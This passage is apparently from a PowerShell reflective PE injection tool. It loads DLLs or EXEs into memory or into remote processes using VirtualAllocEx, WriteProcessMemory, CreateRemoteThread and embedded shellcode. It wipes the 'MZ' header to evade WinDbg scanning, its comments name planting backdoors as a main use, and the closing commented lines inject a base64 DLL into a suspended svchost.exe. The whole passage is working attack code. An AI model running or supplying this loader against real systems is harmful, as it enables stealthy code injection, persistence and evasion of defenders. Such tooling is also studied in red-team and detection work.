	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
        return $true
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}

#Function will return the procID of the suspended process
#$suspendedsvchost = Invoke-CreateProcess -Binary "C:\Windows\System32\svchost.exe" -CreationFlags 0x00000004 -ShowWindow 0x1 -StartF 0x1

#Convert the b64 DLL into bytes so it can be reflectively injected to the suspended proc
#$dllbytes = [Convert]::FromBase64String($dlltoinj)

#Inject the dll
#Invoke-ReflectivePEInjection -PEBytes $dllbytes -ProcId 4076 -DoNotZeroMZ